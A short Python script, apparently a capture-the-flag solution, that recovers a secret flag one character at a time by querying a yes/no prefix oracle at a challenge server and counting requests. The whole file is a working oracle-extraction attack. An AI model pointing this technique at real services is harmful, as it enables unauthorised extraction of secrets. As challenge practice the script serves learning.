import requests, string, sys

BASE = "http://leak7.chal.deti:8016/oracle"

CHARSET= string.ascii_letters + string.digits + "_{}-"
s = requests.Session()
reqs = 0

def is_prefix(p):
    global reqs
    reqs += 1
    r = s.get(BASE, params={"prefix": p}, timeout=5)
    return r.status_code == 200 and r.text.strip() == "yes"

flag = ""
while not flag.endswith("}"):
    for c in CHARSET:
        if is_prefix(flag + c):
            flag += c
            print(f"\r{flag}", end="", flush=True)
            break
    else:
        print("\n[!] no char matched -- charset may be incomplete at:", repr(flag), file=sys.stderr)
        break

print(f"\n[+] flag = {flag}")
print(f"[+] total requests = {reqs}")

